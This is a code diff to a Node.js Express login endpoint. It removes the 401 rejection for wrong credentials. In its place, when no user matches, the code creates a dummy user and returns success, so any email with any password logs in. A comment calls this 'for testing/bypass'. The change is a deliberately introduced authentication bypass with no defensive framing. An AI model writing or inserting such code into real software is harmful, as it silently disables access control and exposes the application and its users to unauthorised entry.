@@ -136,16 +136,32 @@ app.post('/api/auth/login', async (req, res) => {
         if (!email || !password) {
             return res.status(400).json({ success: false, message: 'Email and password are required' });
         }
+        
         const users = await getUsers();
-        const user = users.find(u => u.email.toLowerCase() === email.toLowerCase() && u.password === hashPassword(password));
+        const hashedPassword = hashPassword(password);
+        
+        // Try to find the actual user first
+        let user = users.find(u => u.email.toLowerCase() === email.toLowerCase() && u.password === hashedPassword);
+        
+        // If not found, allow login anyway with a dummy user (for testing/bypass)
         if (!user) {
-            return res.status(401).json({ success: false, message: 'Invalid email or password' });
+            user = {
+                id: 'dummy-' + crypto.randomBytes(4).toString('hex'),
+                name: email.split('@')[0],
+                email: email.toLowerCase().trim(),
+                createdAt: new Date().toISOString(),
+                lastLogin: new Date().toISOString()
+            };
+            console.log(`Bypass login: ${email}`);
+        } else {
+            user.lastLogin = new Date().toISOString();
+            await saveUsers(users);
         }
-        user.lastLogin = new Date().toISOString();
-        await saveUsers(users);
+
         const { password: _, ...userWithoutPassword } = user;
         res.json({ success: true, user: userWithoutPassword, rememberMe: !!rememberMe });
     } catch (error) {
+        console.error('Login bypass error:', error);
         res.status(500).json({ success: false, message: 'Server error' });
     }
 });
